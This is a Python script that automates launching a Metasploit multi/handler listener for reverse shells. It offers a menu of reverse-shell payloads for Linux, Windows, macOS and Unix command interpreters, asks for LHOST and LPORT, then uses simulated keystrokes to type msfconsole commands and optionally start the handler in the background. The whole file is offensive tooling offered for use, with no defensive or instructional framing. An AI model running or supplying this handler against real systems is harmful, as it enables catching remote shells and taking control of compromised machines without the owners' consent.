import os, time
from pynput.keyboard import Key, Controller

keyboard = Controller()

os.system("clear")
print("-" * 80)
print("!!!WARNING PLEASE DO NOT LEAVE THIS TERMINAL WHILE THE PROGRAM IS SETTING UP!!!")
print("-" * 80)
print("Please choose an option: ")
print("1. Manually type payload name. ")
print("2. Choose from a list.")
choiceOne = raw_input("")
os.system("clear")

if choiceOne == "1":
	print("-" * 80)
	payload = raw_input("What payload are you going to be using? ")
elif choiceOne == "2":
	print("-" * 80)
	print("Please choose an option: ")
	print("1. linux/x86/meterpreter/reverse_tcp")
	print("2. windows/meterpreter/reverse_tcp")
	print("3. osx/x86/shell_reverse_tcp")
	print("4. cmd/unix/reverse_python")
	print("5. cmd/unix/reverse_bash")
	print("6. cmd/unix/reverse_perl")
	print("7. Exit Program")
	choiceTwo = raw_input("")
	if choiceTwo == "1":
		payload = "linux/x86/meterpreter/reverse_tcp"
	elif choiceTwo == "2":
		payload = "windows/meterpreter/reverse_tcp"
	elif choiceTwo == "3":
		payload = "osx/x86/shell_reverse_tcp"
	elif choiceTwo == "4":
		payload = "cmd/unix/reverse_python"
	elif choiceTwo == "5":
		payload = "cmd/unix/reverse_bash"
	elif choiceTwo == "6":
		payload = "cmd/unix/reverse_perl"
	elif choiceTwo == "7":
		raw_input("Press any button to continue...\n")
		os.system("exit")
	else:
		print("That is not a valid option!")
		raw_input("Press any button to continue...\n")
		os.system("exit")

else: 
	print("That is not a valid option!")
	raw_input("Press any button to continue...\n")
	os.system("exit")

os.system("clear")
print("-" * 80)
print("How long does your PC take to boot Metasploit? ")
print("1. 10 seconds.")
print("2. 15 seconds.")
print("3. 20 seconds.")
print("4. 25 seconds.")
print("5. Custom time.")
pcSpeed = raw_input("")
if pcSpeed == "1":
	sleeper = "10.0"
elif pcSpeed == "2":
	sleeper = "15.0"
elif pcSpeed == "3":
	sleeper = "20.0"
elif pcSpeed == "4":
	sleeper = "25.0"
elif pcSpeed == "5":
	os.system("clear")
	print("-" * 80)
	sleeper = raw_input("Please enter your custom time in seconds: ")
else:
	print("That is not a valid option!")
	raw_input("Press any button to continue...\n")
	os.system("exit")
sleeperTwo = float(sleeper)

os.system("clear")
print("-" * 80)
ip = raw_input("What is your LHOST? ")
os.system("clear")
print("-" * 80)
port = raw_input("What is your LPORT? ")
os.system("clear")
print("-" * 80)
exploit = raw_input("Do you want to run the exploit immediately? (Y/N) ")
os.system("clear")
exploitTwo = exploit.lower()

os.system("gnome-terminal")
time.sleep(1)
keyboard.type("msfconsole")
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(sleeperTwo)
keyboard.type("use exploit/multi/handler")
keyboard.press(Key.enter)
keyboard.release(Key.enter)
keyboard.type("set payload " + payload)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
keyboard.type("set LHOST " + ip)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
keyboard.type("set lport " + port)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
if exploitTwo == "y":
    keyboard.type("exploit -j -z")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
elif exploitTwo == "n":
    pass
else:
    print("That is not a valid response.")

print("")
print("")
raw_input("Press any key to continue...\n")
os.system("exit")


# os.system("msfconsole")
# time.sleep(10)
# os.system("use exploit/multi/handler")
# os.system("set payload " + payload)
# os.system("set LHOST " + ip)
# os.system("set lport " + port)
# if exploitTwo == "y":
#     os.system("exploit -j -z")
# elif exploitTwo == "n":
#     pass

# else:
#     print("That is not an allowed response.")
